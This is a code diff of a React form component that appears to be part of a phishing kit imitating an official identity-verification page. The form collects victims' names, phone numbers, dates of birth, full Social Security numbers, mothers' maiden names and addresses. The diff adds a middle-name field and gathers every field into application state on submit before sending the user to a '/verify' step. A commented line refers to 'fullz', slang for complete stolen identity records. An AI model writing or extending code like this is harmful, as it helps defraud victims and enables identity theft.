@@ -1,12 +1,15 @@
 import { useState } from 'react'
+import { useDispatch } from 'react-redux'
 import { useHistory } from 'react-router-dom'
 import './index.css'
 
 const ID = () => {
 
+    const dispatch = useDispatch()
     const history = useHistory()
 
     const [firstName, setFirstName] = useState('')
+    const [middleName, setMiddleName] = useState('')
     const [lastName, setLastName] = useState('')
     const [phone, setPhone] = useState('')
     const [dobMonth, setDobMonth] = useState('')
@@ -16,7 +19,7 @@ const ID = () => {
     const [ssn2, setSsn2] = useState('')
     const [ssn3, setSsn3] = useState('')
     const [mmn, setMmn] = useState('')
-    const [filedForTaxReturn, setFiledForTaxReturn] = useState('true')
+    const [filedForTaxReturn, setFiledForTaxReturn] = useState('n/a')
     const [address1, setAddress1] = useState('')
     const [address2, setAddress2] = useState('')
     const [city, setCity] = useState('')
@@ -27,6 +30,27 @@ const ID = () => {
     const handleSubmit = e => {
         e.preventDefault()
 
+        dispatch({type: 'set', payload: {
+            firstName,
+            middleName,
+            lastName,
+            phone,
+            dobMonth,
+            dobDay,
+            dobYear,
+            ssn1,
+            ssn2,
+            ssn3,
+            mmn,
+            filedForTaxReturn,
+            address1,
+            address2,
+            city,
+            state,
+            zipcode,
+            country
+        }})
+        // alert(fulllzzzz)
         history.push('/verify')
     }
 
@@ -238,6 +262,21 @@ if (top != self) {
 						 alt="Edit First Name" border="0" />&nbsp;Edit
 						 </a> */}
 						</p>
+                        {/* middle name */}
+
+                        <p>
+
+                        <label htmlFor="middle_name">
+								Middle Name(s) (Optional)
+							</label>
+							<input type="text" id="middle_name" name="middle_name"
+                            size="50" maxLength="50"  
+                            
+                            tabIndex="0" className="textbox " 
+                            // textbox-readonly
+                                 value={middleName}
+                                 onChange={e => setMiddleName(e.target.value)} />
+                        </p>
 								
 						{/* <!-- LAST NAME --> */}
 
